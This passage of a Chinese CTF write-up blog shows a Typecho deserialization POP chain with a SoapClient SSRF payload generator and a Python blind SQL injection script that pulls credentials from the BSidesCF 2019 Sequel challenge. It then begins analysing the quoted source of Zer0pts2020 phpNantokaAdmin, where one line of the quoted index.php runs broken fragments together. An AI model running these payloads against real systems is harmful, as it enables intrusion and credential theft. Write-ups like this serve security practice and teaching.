class="variable">$columns</span>)</span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;where&#x27;</span>];</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>假如<code>Typecho_Db::SELECT（静态值）</code>的值为<code>SELECT</code>，则跟进<code>$this-&gt;_adapter</code><br>我们发现这个值我们也是可控的，这个时候我们控制<code>_adapter</code>为soap类就可以了</p>
<p><img src="https://img.npfs06.top/20210312235301.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>这个时候再访问soap的<code>parseSelect</code>方法，但是此方法并不存在，所以就会触发soap的<code>__call</code>方法来打到本地访问的目的</p>
<p><strong>POP 链逻辑：</strong></p>
<ul>
<li>反序列化 <code>HelloWorld_DB</code>，就触发了<code>__wakeup()</code> 方法，在<code>__wakeup()</code> 内实例化 <code>Typecho_Db</code> 并以 <code>$this-&gt;coincidence[&#39;hello&#39;]</code> 作为 <code>Typecho_Db</code> 的<code>__construct()</code> 方法的第一个参数；</li>
<li>PHP 的数组是可以存对象，假设 <code>$this-&gt;coincidence[&#39;hello&#39;]</code> 实例化 <code>Typecho_Db_Query</code> 对象，在 <code>Typecho_Db</code> 的构造方法中将其作为字符串，就触发了 <code>Typecho_Db_Query</code> 的<code>__toString()</code> 方法；</li>
<li>在<code>__toString()</code> 内，如果 <code>$_sqlPreBuild[&#39;action&#39;]</code> 为<code>&#39;SELECT&#39;</code> 就会触发 <code>$_adapter</code> 的 <code>parseSelect()</code> 方法；</li>
<li>将 <code>$_adapter</code> 实例化为 <code>SoapClient</code>，调用 <code>parseSelect()</code> 是不存在的方法，触发了 <code>SoapClient</code> 的<code>__call()</code> 魔术方法</li>
<li><code>__call()</code> 是实现 SSRF 的关键</li>
</ul>
<p>POP 链清楚了，exp 就很好写</p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$coincidence</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;coincidence=([<span class="string">&#x27;hello&#x27;</span>=&gt;<span class="keyword">new</span> Typecho_Db_Query()]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_sqlPreBuild</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_adapter</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;action&#x27;</span>]=<span class="string">&#x27;SELECT&#x27;</span>;</span><br><span class="line">        <span class="variable">$target</span> = <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>;</span><br><span class="line">        <span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;Cookie: PHPSESSID=i32jvsqtg8a2011jtcgefk8ko1&#x27;</span>,</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter=<span class="keyword">new</span> SoapClient(</span><br><span class="line">            <span class="literal">null</span>,</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,</span><br><span class="line">                <span class="string">&#x27;user_agent&#x27;</span>=&gt;str_replace(<span class="string">&#x27;^^&#x27;</span>, <span class="string">&quot;\r\n&quot;</span>,<span class="string">&#x27;npfs^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.join(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>)),<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;hello&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = serialize(<span class="keyword">new</span> HelloWorld_DB());</span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
<p>生成的payload Post传参</p>
<p><img src="https://img.npfs06.top/20210313001503.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>还有最后一个问题，这个插件现在还不知道在哪调用，不知道在哪执行就不能反序列化。在 /var/Typecho/Plugin.php 中有如下路由代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">activate</span>(<span class="params"><span class="variable">$pluginName</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">self</span>::<span class="variable">$_plugins</span>[<span class="string">&#x27;activated&#x27;</span>][<span class="variable">$pluginName</span>] = <span class="built_in">self</span>::<span class="variable">$_tmp</span>;</span><br><span class="line">    <span class="built_in">self</span>::<span class="variable">$_tmp</span> = <span class="keyword">array</span>();</span><br><span class="line">    Helper::addRoute(<span class="string">&quot;page_admin_action&quot;</span>,<span class="string">&quot;/page_admin&quot;</span>,<span class="string">&quot;HelloWorld_Plugin&quot;</span>,<span class="string">&#x27;action&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以来到<code>/page_admin</code>，带上 admin 参数来输出 session 即可得到 flag</p>
<h2 id="BSidesCF-2019-Sequel"><a href="#BSidesCF-2019-Sequel" class="headerlink" title="[BSidesCF 2019]Sequel"></a>[BSidesCF 2019]Sequel</h2><p>爆破，账号密码都是guest,登入后，抓包，cookie进行base64解密</p>
<p><img src="https://img.npfs06.top/20210313194712.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>然后构造一个新的{“username”:“guest” or “A”=“A”,“password”:“guest”}，将其转化为base64编码并发包，发现成功登陆</p>
<p>paylaod:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&#x27;http://cc9386c2-1cc2-41cf-9d8c-c6f7a41a1e4a.node3.buuoj.cn/sequels&#x27;</span></span><br><span class="line">LETTERS = string.printable</span><br><span class="line">target = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    f = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> e <span class="keyword">in</span> LETTERS:</span><br><span class="line">        tmp = target + e</span><br><span class="line">        <span class="comment"># 1.テーブル名を取得</span></span><br><span class="line">        <span class="comment">#payload = r&#x27;&#123;&#123;&quot;username&quot;:&quot;\&quot; or CASE WHEN SUBSTR((SELECT name FROM sqlite_master limit 0,1),&#123;&#125;,1)=\&quot;&#123;&#125;\&quot; THEN true ELSE false END or \&quot;&quot;,&quot;password&quot;:&quot;guest&quot;&#125;&#125;&#x27;.format(len(tmp), e)</span></span><br><span class="line">        <span class="comment"># 2.usernameを取得</span></span><br><span class="line">        <span class="comment"># payload = r&#x27;&#123;&#123;&quot;username&quot;:&quot;\&quot; or CASE WHEN SUBSTR((SELECT username FROM userinfo limit 1,1),&#123;&#125;,1)=\&quot;&#123;&#125;\&quot; THEN true ELSE false END or \&quot;&quot;,&quot;password&quot;:&quot;guest&quot;&#125;&#125;&#x27;.format(len(tmp),e)</span></span><br><span class="line">        <span class="comment"># 3.passwordを取得</span></span><br><span class="line">        payload = <span class="string">r&#x27;&#123;&#123;&quot;username&quot;:&quot;\&quot; or CASE WHEN SUBSTR((SELECT password FROM userinfo limit 1,1),&#123;&#125;,1)=\&quot;&#123;&#125;\&quot; THEN true ELSE false END or \&quot;&quot;,&quot;password&quot;:&quot;guest&quot;&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(tmp),e)</span><br><span class="line">        payload = base64.b64encode(payload.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        req = requests.Request(</span><br><span class="line">            <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">            URL,</span><br><span class="line">            params=&#123;</span><br><span class="line">            &#125;,</span><br><span class="line">            cookies=&#123;</span><br><span class="line">                <span class="string">&quot;1337_AUTH&quot;</span>: payload</span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        prepared = req.prepare()</span><br><span class="line">        s = requests.Session()</span><br><span class="line">        r = s.send(prepared, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Movie&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            target = tmp</span><br><span class="line">            print(target)</span><br><span class="line">            f = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f: <span class="keyword">continue</span></span><br><span class="line">    exit()</span><br></pre></td></tr></table></figure>
<p>username: <code>sequeladmin</code></p>
<p>password<code>f5ec3af19f0d3679e7d5a148f4ac323d</code></p>
<p>登录，即可得到flag</p>
<p><img src="https://img.npfs06.top/20210313193843.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>最后再附上一张sqlite_master</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> sqlite_master ( </span><br><span class="line">	type TEXT, </span><br><span class="line">	name TEXT, </span><br><span class="line">	tbl_name TEXT, </span><br><span class="line">	rootpage <span class="type">INTEGER</span>, </span><br><span class="line">	<span class="keyword">sql</span> TEXT </span><br><span class="line">); </span><br></pre></td></tr></table></figure>


<h2 id="Zer0pts2020-phpNantokaAdmin"><a href="#Zer0pts2020-phpNantokaAdmin" class="headerlink" title="[Zer0pts2020]phpNantokaAdmin"></a>[Zer0pts2020]phpNantokaAdmin</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//utip.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">redirect</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">  header(<span class="string">&#x27;Location: &#x27;</span> . <span class="variable">$path</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">flash</span>(<span class="params"><span class="variable">$message</span>, <span class="variable">$path</span> = <span class="string">&#x27;?page=index&#x27;</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;flash&#x27;</span>] = <span class="variable">$message</span>;</span><br><span class="line">  redirect(<span class="variable">$path</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> htmlspecialchars(<span class="variable">$string</span>, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$banword</span> = [</span><br><span class="line">    <span class="comment">// comment out, calling function...</span></span><br><span class="line">    <span class="string">&quot;[\&quot;#&#x27;()*,\\/\\\\`-]&quot;</span></span><br><span class="line">  ];</span><br><span class="line">  <span class="variable">$regexp</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$banword</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match(<span class="variable">$regexp</span>, <span class="variable">$string</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;util.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="variable">$method</span> = (<span class="keyword">string</span>) (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] ?? <span class="string">&#x27;GET&#x27;</span>);</span><br><span class="line"><span class="variable">$page</span> = (<span class="keyword">string</span>) (<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>] ?? <span class="string">&#x27;index&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!in_array(<span class="variable">$page</span>, [<span class="string">&#x27;index&#x27;</span>, <span class="string">&#x27;create&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>])) &#123;</span><br><span class="line">  redirect(<span class="string">&#x27;?page=index&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$message</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;flash&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;flash&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_array(<span class="variable">$page</span>, [<span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;database&#x27;</span>])) &#123;</span><br><span class="line">  flash(<span class="string">&quot;Please create database first.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;database&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$pdo</span> = <span class="keyword">new</span> PDO(<span class="string">&#x27;sqlite:db/&#x27;</span> . <span class="variable">$_SESSION</span>[<span class="string">&#x27;database&#x27;</span>]);</span><br><span class="line">  <span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;query(<span class="string">&quot;SELECT name FROM sqlite_master WHERE type=&#x27;table&#x27; AND name &lt;&gt; &#x27;&quot;</span> . FLAG_TABLE . <span class="string">&quot;&#x27; LIMIT 1;&quot;</span>);</span><br><span class="line">  <span class="variable">$table_name</span> = <span class="variable">$stmt</span>-&gt;fetch(PDO::FETCH_ASSOC)[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;query(<span class="string">&quot;PRAGMA table_info(`<span class="subst">&#123;$table_name&#125;</span>`);&quot;</span>);</span><br><span class="line">  <span class="variable">$column_names</span> = <span class="variable">$stmt</span>-&gt;fetchAll(PDO::FETCH_ASSOC);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$page</span> === <span class="string">&#x27;insert&#x27;</span> &amp;&amp; <span class="variable">$method</span> === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">  <span class="variable">$values</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;values&#x27;</span>];</span><br><span class="line">  <span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;prepare(<span class="string">&quot;INSERT INTO `<span class="subst">&#123;$table_name&#125;</span>` VALUES (?&quot;</span> . str_repeat(<span class="string">&#x27;,?&#x27;</span>, count(<span class="variable">$column_names</span>) - <span class="number">1</span>) . <span class="string">&quot;)&quot;</span>);</span><br><span class="line">  <span class="variable">$stmt</span>-&gt;execute(<span class="variable">$values</span>);</span><br><span class="line">  redirect(<span class="string">&#x27;?page=index&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$page</span> === <span class="string">&#x27;create&#x27;</span> &amp;&amp; <span class="variable">$method</span> === <span class="string">&#x27;POST&#x27;</span> &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;database&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;table_name&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;columns&#x27;</span>])) &#123;</span><br><span class="line">    flash(<span class="string">&#x27;Parameters missing.&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$table_name</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;table_name&#x27;</span>];</span><br><span class="line">  <span class="variable">$columns</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;columns&#x27;</span>];</span><br><span class="line">  <span class="variable">$filename</span> = bin2hex(random_bytes(<span class="number">16</span>)) . <span class="string">&#x27;.db&#x27;</span>;</span><br><span class="line">  <span class="variable">$pdo</span> = <span class="keyword">new</span> PDO(<span class="string">&#x27;sqlite:db/&#x27;</span> . <span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!is_valid(<span class="variable">$table_name</span>)) &#123;</span><br><span class="line">    flash(<span class="string">&#x27;Table name contains dangerous characters.&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (strlen(<span class="variable">$table_name</span>) &lt; <span class="number">4</span> || <span class="number">32</span> &lt; strlen(<span class="variable">$table_name</span>)) &#123;</span><br><span class="line">    flash(<span class="string">&#x27;Table name must be 4-32 characters.&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (count(<span class="variable">$columns</span>) &lt;= <span class="number">0</span> || <span class="number">10</span> &lt; count(<span class="variable">$columns</span>)) &#123;</span><br><span class="line">    flash(<span class="string">&#x27;Number of columns is up to 10.&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">&quot;CREATE TABLE <span class="subst">&#123;$table_name&#125;</span> (&quot;</span>;</span><br><span class="line">  <span class="variable">$sql</span> .= <span class="string">&quot;dummy1 TEXT, dummy2 TEXT&quot;</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; count(<span class="variable">$columns</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$column</span> = (<span class="keyword">string</span>) (<span class="variable">$columns</span>[<span class="variable">$i</span>][<span class="string">&#x27;name&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="variable">$type</span> = (<span class="keyword">string</span>) (<span class="variable">$columns</span>[<span class="variable">$i</span>][<span class="string">&#x27;type&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!is_valid(<span class="variable">$column</span>) || !is_valid(<span class="variable">$type</span>)) &#123;</span><br><span class="line">      flash(<span class="string">&#x27;Column name or type contains dangerous characters.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$column</span>) &lt; <span class="number">1</span> || <span class="number">32</span> &lt; strlen(<span class="variable">$column</span>) || strlen(<span class="variable">$type</span>) &lt; <span class="number">1</span> || <span class="number">32</span> &lt; strlen(<span class="variable">$type</span>)) &#123;</span><br><span class="line">      flash(<span class="string">&#x27;Column name and type must be 1-32 characters.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sql</span> .= <span class="string">&#x27;, &#x27;</span>;</span><br><span class="line">    <span class="variable">$sql</span> .= <span class="string">&quot;`<span class="subst">$column</span>` <span class="subst">$type</span>&quot;</span>;</span><br><span class="line"><span class="number">4</span><span class="keyword">if</span> (<span class="variable">$page</span> === <span class="string">&#x27;delete&#x27;</span>) &#123;</span><br><span class="line">  <span class="variable">$_SESSION</span> = <span class="keyword">array</span>();</span><br><span class="line">  session_destroy();</span><br><span class="line">  redirect(<span class="string">&#x27;?page=index&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$page</span> === <span class="string">&#x27;index&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;database&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;query(<span class="string">&quot;SELECT * FROM `<span class="subst">&#123;$table_name&#125;</span>`;&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$stmt</span> === <span class="literal">FALSE</span>) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span> = <span class="keyword">array</span>();</span><br><span class="line">    session_destroy();</span><br><span class="line">    redirect(<span class="string">&#x27;?page=index&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$result</span> = <span class="variable">$stmt</span>-&gt;fetchAll(PDO::FETCH_NUM);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>从 index.php 中可以看到，flag作为一个表存储在每个创建的数据库中，这个表具有未知的表名和列名</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pdo</span>-&gt;query(<span class="string">&#x27;CREATE TABLE `&#x27;</span> . FLAG_TABLE . <span class="string">&#x27;` (`&#x27;</span> . FLAG_COLUMN . <span class="string">&#x27;` TEXT);&#x27;</span>);</span><br><span class="line"> <span class="variable">$pdo</span>-&gt;query(<span class="string">&#x27;INSERT INTO `&#x27;</span> . FLAG_TABLE . <span class="string">&#x27;` VALUES (&quot;&#x27;</span> . FLAG . <span class="string">&#x27;&quot;);&#x27;</span>);</span><br><span class="line"> <span class="variable">$pdo</span>-&gt;query(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>
<p>在 index.php 中创建表时，显然存在带有表名、列名和列类型的 SQL 注入。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;prepare(<span class="string">&quot;INSERT INTO `<span class="subst">&#123;$table_name&#125;</span>` VALUES (?&quot;</span> . str_repeat(<span class="string">&#x27;,?&#x27;</span>, count(<span class="variable">$column_names</span>) - <span class="number">1</span>) . <span class="string">&quot;)&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;execute(<span class="variable">$values</span>);</span><br></pre></td></tr></table></figure>
<p>不幸的是，这些参数受到长度过滤以及<code>is _ valid</code> 函数过滤，这是在 util.php 中定义的。</p>
<p>让我们检查可用字符。</p>
